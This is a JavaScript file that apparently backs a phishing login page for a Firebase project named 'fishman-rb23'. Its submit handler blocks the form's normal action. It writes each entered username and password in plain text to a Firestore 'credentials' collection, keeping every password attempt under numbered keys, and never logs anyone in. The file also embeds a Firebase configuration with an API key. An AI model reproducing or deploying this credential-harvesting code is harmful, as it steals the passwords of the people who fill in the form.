// Import the necessary Firebase modules
import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.12.1/firebase-app.js';
import { getFirestore, collection, doc, getDoc, setDoc, updateDoc } from 'https://www.gstatic.com/firebasejs/9.12.1/firebase-firestore.js';

// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyABIbJenznGoBH3V_4V3eCUfSB2yFN2TS8",
  authDomain: "fishman-rb23.firebaseapp.com",
  projectId: "fishman-rb23",
  storageBucket: "fishman-rb23.appspot.com",
  messagingSenderId: "537342267563",
  appId: "1:537342267563:web:038a4dd39a07d7a24767ee"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Function to create or update a document in the "credentials" collection
async function addCredential(username, password) {
  try {
    // Reference to the document with the username as the ID
    const credDocRef = doc(collection(db, "credentials"), username);

    // Check if the document already exists
    const credDoc = await getDoc(credDocRef);

    if (credDoc.exists()) {
      // Document exists, update it with a new password property
      const data = credDoc.data();
      const passCount = Object.keys(data).filter(key => key.startsWith('pass')).length;
      const newPassKey = `pass${passCount + 1}`;
      await updateDoc(credDocRef, { [newPassKey]: password });
    } else {
      // Document does not exist, create a new one with the username as ID
      await setDoc(credDocRef, { pass1: password });
    }

    console.log("Credential added/updated successfully.");
  } catch (error) {
    console.error("Error adding/updating credential: ", error);
  }
}

// Wait for the DOM to load before accessing the form
document.addEventListener("DOMContentLoaded", () => {
  // Get a reference to the login form
  const loginForm = document.getElementById("login-form");

  // Add an event listener to the login form
  loginForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    // Add the new credential
    await addCredential(username, password);
  });
});
